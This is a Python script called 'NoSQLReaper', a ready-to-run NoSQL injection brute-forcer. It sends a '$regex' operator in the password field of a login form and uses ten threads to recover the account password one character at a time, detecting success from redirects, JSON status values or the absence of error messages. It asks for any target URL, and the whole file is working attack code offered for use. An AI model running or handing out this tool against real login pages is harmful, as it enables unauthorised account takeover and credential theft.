import requests
import string
import threading
from queue import Queue

def send_request(url, password_pattern):
    
    data = {
        "user": "whoami", # Change Me
        "pass[$regex]": f"^{password_pattern}.*$",
        # Add more data according to the Response Traffic (if needed)
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)
        location_header = response.headers.get("Location", "")
        response_text = response.text.lower()
        
        # Redirect-based login (302 + Location header)
        if location_header and location_header not in ["/", "/?err=1", "", None]:
            return True
        
        # JSON-based authentication response
        try:
            response_json = response.json()
            if response_json.get("status") in ["success", "authenticated", "ok", "true"]:
                return True
        except ValueError:
            pass  
        
        # HTML-based validation message
        error_keywords = ["invalid", "error", "wrong", "failed", "incorrect"]
        if any(keyword in response_text for keyword in error_keywords):
            return False
        
        return False  
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return False

def worker(queue, url, password_prefix, result):
    
    while not queue.empty():
        char = queue.get()
        attempt = password_prefix + char
        if send_request(url, attempt):
            result.append(char)
            queue.queue.clear()  
            return
        queue.task_done()

def brute_force_password(url):
    
    print("\n🛸 NoSQLReaper - The NoSQL Injection Brute-Forcer 🛸\n")
    password = ""
    valid_chars = string.ascii_letters + string.digits + string.punctuation
    
    for _ in range(11):  # Password length is set to 11 but can be increased if needed
        queue = Queue()
        result = []
        
        for char in valid_chars:
            queue.put(char)
        
        threads = []
        for _ in range(10):  # Adjust the number of threads as needed
            thread = threading.Thread(target=worker, args=(queue, url, password, result))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        if result:
            password += result[0]
            print(f"[+] Found character: {password}")
        else:
            print("[-] No valid character found! Something is wrong.")
            break
    
    print(f"[*] NoSQLReaper Found Password: {password}")

if __name__ == "__main__":
    print(r"""
.     .       .  .   . .   .   . .    +  .
  .     .  :     .    .. :. .___---------___.
       .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
    .  :       .  .  .:../:            . .^  :.\.
        .   . :: +. :.:/: .   .    .        . . .:\
 .  :    .     . _ :::/:               .  ^ .  . .:\
  .. . .   . - : :.:./.                        .  .:\
  .      .     . :..|:                    .  .  ^. .:|
    .       . : : ..||        .                . . !:|
  .     . . . ::. ::\(                           . :) /
 .   .     : . : .:.|. ######              .#######::|
  :.. .  :-  : .:  ::|.#######           ..########:|
 .  .  .  ..  .  .. :\ ########          :######## :/
  .        .+ :: : -.:\ ########       . ########.:/
    .  .+   . . . . :.:\. #######       #######..:/
      :: . . . . ::.:..:.\           .   .   ..:/
   .   .   .  .. :  -::::.\       | |     . .:/
      .  :  .  .  .-:.":.::.\             ..:/
 .      -.   . . . .: .:::.:.\           .:/
.   .   .  :      : ....::_:..:\   ___.  :/
   .   .  .   .:. .. .  .: :.:.\       :/
     +   .   .   : . ::. :.:. .:.|\  .:/|
     .         +   .  .  ...:: ..|  --.:|
.      . . .   .  .  . ... :..:.."(  ..)"
 .   .       .      :  .   .: ::/  .  .::\
""")
    target_url = input("Enter the target URL: ")
    brute_force_password(target_url)
